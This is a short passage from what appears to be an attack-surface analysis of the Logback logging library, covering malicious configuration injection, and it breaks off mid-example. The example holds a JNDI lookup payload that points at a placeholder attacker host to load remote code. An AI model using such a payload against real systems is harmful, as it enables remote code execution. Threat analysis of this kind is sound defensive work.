# Attack Surface Analysis for qos-ch/logback

## Attack Surface: [1. Malicious Configuration Injection](./attack_surfaces/1__malicious_configuration_injection.md)

*   **Description:** Attackers inject malicious Logback configuration to control logging behavior, potentially leading to RCE or other exploits.
*   **Logback Contribution:** Logback's core functionality relies on its configuration (XML or programmatic).  This configuration *defines* Logback's behavior, making it a high-value target.  The vulnerability exists when Logback processes untrusted configuration data.
*   **Example:** An attacker modifies `logback.xml` to include a JNDI lookup: `<insert value="${jndi:ldap://attacker.com/evil}

